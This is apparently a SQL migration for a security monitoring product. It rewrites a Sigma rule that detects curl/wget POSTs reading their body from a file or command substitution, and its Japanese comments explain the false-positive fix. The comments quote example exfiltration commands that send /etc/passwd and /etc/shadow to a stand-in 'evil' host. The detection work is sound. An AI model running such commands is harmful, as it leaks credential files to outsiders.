-- 325: "Data Exfiltration via curl/wget POST (Linux)"(migration 295, T1048)の
-- medium重大度FPを是正。
--
-- 2026-07-12 の medium-sev FP調査で検出: 旧ルールは tool(curl/wget) AND
-- method(`-X POST`/`--data`/...) で発火するため、`curl -X POST -d '{"k":"v"}'
-- https://api.company.com/...` のような**正規の API 呼び出し(インラインJSONのPOST)全て**で
-- 誤検知していた。API 自動化は極めて一般的でノイズが大きい。
--
-- 是正: 持ち出し(データを吸い出すPOST)に固有の「本文をファイル/コマンド置換から読む」
-- パターン(`--data @` / `--data-binary @` / `-d @` / `--post-file` / `-d "$(` 等)のみに
-- 絞り、インラインの `-X POST`/`--data '...'` は除外。これで正規 API POST は発火せず、
-- `curl --data-binary @/etc/passwd https://evil` や `curl -d "$(cat /etc/shadow)" ...` の
-- ような持ち出しは引き続き発火する。295 ソースも同内容に修正済み。冪等。

UPDATE rules
SET content = $SIGMA$title: Data Exfiltration via curl/wget POST (Linux)
status: stable
description: Detects an HTTP POST via curl/wget whose body is read from a FILE or a command substitution (dumping data out), the ad-hoc exfiltration pattern. Inline API POSTs (curl -X POST -d '{json}') are intentionally excluded to avoid firing on routine API automation.
logsource:
  category: process_creation
  product: linux
detection:
  tool:
    CommandLine|contains:
      - 'curl'
      - 'wget'
  exfil_body:
    CommandLine|contains:
      - '--data @'
      - '--data-binary @'
      - '-d @'
      - '--post-file'
      - '--data "$('
      - "--data '$("
      - '-d "$('
      - "-d '$("
      - '--data=@'
      - '--data-binary=@'
  condition: tool and exfil_body
falsepositives:
  - Backup or automation scripts POSTing a file body via curl/wget
level: medium$SIGMA$
WHERE id = 'ed6e0002-0000-0000-0000-000000001048';
